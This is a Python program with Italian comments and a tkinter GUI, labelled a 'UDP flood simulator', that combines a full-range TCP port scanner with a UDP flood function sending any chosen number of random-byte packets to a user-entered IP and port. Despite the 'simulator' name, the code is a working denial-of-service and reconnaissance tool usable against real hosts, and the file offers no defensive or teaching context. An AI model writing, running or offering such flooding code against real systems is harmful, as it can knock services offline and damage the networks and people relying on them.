import socket
import random
import argparse
import tkinter as tk
from tkinter import messagebox

def generate_packet(size):
    """Genera un pacchetto di byte casuali della dimensione specificata."""
    return random.randbytes(size)

def udp_flood(target_ip, target_port, packet_size, packet_count):
    """Simula un UDP flood inviando pacchetti verso l'IP e la porta specificati."""
    
    # Creazione del socket UDP
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        print(f"Inizio attacco UDP flood su {target_ip}:{target_port}")

        for i in range(packet_count):
            try:
                packet = generate_packet(packet_size)
                sock.sendto(packet, (target_ip, target_port))
                print(f"[{i + 1}/{packet_count}] Pacchetto inviato")
            except Exception as e:
                print(f"Errore durante l'invio del pacchetto: {e}")
                break

        print("Attacco completato!")

def scan_ports(target_ip):
    """Scansiona le porte aperte su un IP target."""
    open_ports = []
    for port in range(1, 65536):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            if s.connect_ex((target_ip, port)) == 0:
                open_ports.append(port)
    return open_ports

def start_port_scan():
    """Avvia la scansione delle porte sul target specificato."""
    target_ip = ip_entry.get()

    if not target_ip:
        messagebox.showerror("Errore", "Inserisci un IP per la scansione delle porte!")
        return

    try:
        open_ports = scan_ports(target_ip)
        if open_ports:
            messagebox.showinfo("Porte Aperte", f"Porte aperte trovate: {open_ports}")
        else:
            messagebox.showinfo("Porte Aperte", "Nessuna porta aperta trovata.")
    except Exception as e:
        messagebox.showerror("Errore", f"Si è verificato un errore: {e}")

def start_udp_flood():
    """Avvia l'UDP flood con i parametri forniti dall'utente."""
    target_ip = ip_entry.get()
    target_port = port_entry.get()
    packet_size = size_entry.get()
    packet_count = count_entry.get()

    if not target_ip or not target_port or not packet_size or not packet_count:
        messagebox.showerror("Errore", "Tutti i campi devono essere compilati!")
        return

    try:
        target_port = int(target_port)
        packet_size = int(packet_size)
        packet_count = int(packet_count)
        udp_flood(target_ip, target_port, packet_size, packet_count)
        messagebox.showinfo("Successo", "Attacco UDP flood completato!")
    except ValueError:
        messagebox.showerror("Errore", "Porta, dimensione pacchetti e numero pacchetti devono essere numeri interi!")
    except Exception as e:
        messagebox.showerror("Errore", f"Si è verificato un errore: {e}")

def create_gui():
    """Crea l'interfaccia grafica del programma."""
    global ip_entry, port_entry, size_entry, count_entry

    root = tk.Tk()
    root.title("Simulatore UDP Flood")

    tk.Label(root, text="IP Target:").grid(row=0, column=0, padx=10, pady=5, sticky="e")
    ip_entry = tk.Entry(root, width=30)
    ip_entry.grid(row=0, column=1, padx=10, pady=5)

    tk.Label(root, text="Porta Target:").grid(row=1, column=0, padx=10, pady=5, sticky="e")
    port_entry = tk.Entry(root, width=30)
    port_entry.grid(row=1, column=1, padx=10, pady=5)

    tk.Label(root, text="Dimensione Pacchetto (byte):").grid(row=2, column=0, padx=10, pady=5, sticky="e")
    size_entry = tk.Entry(root, width=30)
    size_entry.grid(row=2, column=1, padx=10, pady=5)

    tk.Label(root, text="Numero di Pacchetti:").grid(row=3, column=0, padx=10, pady=5, sticky="e")
    count_entry = tk.Entry(root, width=30)
    count_entry.grid(row=3, column=1, padx=10, pady=5)

    tk.Button(root, text="Scansiona Porte", command=start_port_scan).grid(row=4, column=0, pady=10)
    tk.Button(root, text="Avvia UDP Flood", command=start_udp_flood).grid(row=4, column=1, pady=10)

    root.mainloop()

if __name__ == "__main__":
    create_gui()
